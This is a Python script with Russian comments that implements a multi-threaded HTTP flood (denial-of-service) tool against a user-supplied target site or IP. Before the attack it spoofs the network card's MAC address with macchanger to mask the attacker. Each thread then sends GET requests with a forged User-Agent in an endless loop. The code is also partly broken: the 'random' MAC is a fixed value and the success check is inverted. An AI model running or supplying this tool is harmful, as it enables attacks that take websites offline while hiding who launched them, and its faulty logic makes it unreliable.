import requests
import socket
import threading
import subprocess
import validators

def get_interfaces():
    # Получаем список доступных интерфейсов
    result = subprocess.check_output(['ifconfig', '-a']).decode()
    interfaces = [i.split()[0] for i in result.split('\n\n') if i and 'LOOPBACK' not in i]
    return interfaces


def get_mac(interface):
    # Получаем текущий MAC-адрес интерфейса
    result = subprocess.check_output(['macchanger', '-s', interface]).decode().strip()
    mac = result.split()[-1]
    return mac


def set_mac(interface, mac):
    # Меняем MAC-адрес интерфейса
    try:
        subprocess.check_call(['sudo', 'macchanger', '-m', mac, interface])
    except subprocess.CalledProcessError as e:
        print(f'Error changing MAC address: {e}')
        return


def change_mac():
    # Получаем список интерфейсов и выводим их на экран
    interfaces = get_interfaces()
    print('Available interfaces:')
    for i, iface in enumerate(interfaces):
        print(f'{i+1}. {iface}')
    iface_num = input("Select interface to change MAC: ")
    try:
        iface_num = int(iface_num) - 1
        iface = interfaces[iface_num]
    except:
        print('Invalid interface number')
        return

    current_mac = get_mac(iface)
    print(f'Current MAC address of {iface}: {current_mac}')

    # Запрашиваем новый MAC-адрес у пользователя
    new_mac = input("Enter new MAC address (press enter for random MAC): ")
    if not new_mac:
        # Генерируем новый случайный MAC-адрес
        new_mac = ':'.join(['{:02x}'.format((i + 1) % 256) for i in range(6)])

    # Меняем MAC-адрес
    set_mac(iface, new_mac)

    # Проверяем, что MAC-адрес изменился
    if current_mac == new_mac:
        print(f'MAC address of {iface} has been changed to {new_mac} successfully')
    else:
        print(f'Failed to change MAC address of {iface}')


# функция для получения ссылки на атакуемый сайт (URL или IP-адрес)
def get_link():
    while True:
        link = input('Enter link or IP address of the target: ')
        if validators.url(link) or validators.ipv4(link):
            return link
        else:
            print("Invalid link or IP address. Please try again.")

# функция для создания запросов на атакуемый сайт
def get_content(link):
    i = 1  # счетчик отправленных запросов
    # определяем тип адреса (URL или IP-адрес)
    if link.startswith("http://") or link.startswith("https://"):
        while True:
            try:
                # отправляем GET-запрос на атакуемый сайт с поддельным заголовком
                r = requests.get(link, headers={
                    'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/69.0'})
                r_answer = r.content  # сохраняем содержимое ответа
                print('Sent packages:', i)  # выводим статистику
                i += 1
            except:
                print('Looks like the website', link, 'is down. Checking again...')  # сайт не отвечает, проверяем снова
    else:
        while True:
            try:
                # преобразуем IP-адрес в формат, который можно использовать для создания сокета
                ip = socket.gethostbyname(link)
                # создаем сокет и отправляем GET-запрос на указанный IP-адрес
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((ip, 80))
                s.sendall(b"GET / HTTP/1.1\r\nHost: " + link.encode() + b"\r\n\r\n")
                r_answer = s.recv(1024)
                s.close()
                print('Sent packages:', i)  # выводим статистику
                i += 1
            except:
                print('Looks like the IP address', link, 'is down. Checking again...')  # адрес не отвечает, проверяем снова

# основная функция, вызывающая функции для получения ссылки и отправки запросов
def main():
    change_mac()
    link = get_link()  # получаем ссылку на атакуемый сайт
    threads_count = int(input("Enter threads count: "))
    threads = [threading.Thread(target=get_content, args=(link,)) for _ in range(threads_count)]
    for thread in threads:
        thread.start()
    for thread in threads:
        thread.join()
    print("Finished sending requests")


if __name__ == '__main__':
    # вызываем основную функцию, если скрипт запущен напрямую
    main()